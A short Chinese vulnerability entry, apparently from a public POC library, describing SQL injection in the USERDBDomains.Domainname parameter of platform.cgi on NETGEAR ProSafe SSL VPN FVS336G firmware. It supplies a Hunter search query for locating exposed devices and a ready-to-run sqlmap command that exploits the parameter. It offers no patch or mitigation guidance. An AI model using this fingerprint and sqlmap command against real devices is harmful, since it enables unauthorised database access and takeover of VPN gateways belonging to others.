# NETGEAR ProSafe SSL VPN SQL注入（CNNVD-202205-3298）

# 一、漏洞简介
NETGEAR FVS336G是美国网件（NETGEAR）公司的一款VPN（虚拟私人网络）防火墙路由器。NETGEAR ProSafe SSL VPN firmware FVS336Gv2 和FVS336Gv3版本存在安全漏洞，该漏洞源于cgi-bin/platform.cgi中的USERDBDomains.Domainname参数缺少过滤转义。攻击者可利用该漏洞进行SQL注入攻击，进而控制系统。

# 二、影响版本
+ NETGEAR ProSafe SSL VPN 

# 三、资产测绘
+ hunter`app.name=="NETGEAR ProSAFE"`
+ 特征


# 四、漏洞复现
**sqlmap **

```plain
sqlmap -u "https://xx.xx.xx.xx/scgi-bin/platform.cgi" --form  -p USERDBDomains.Domainname --batch
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mvw70mskzp0yhtyf>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
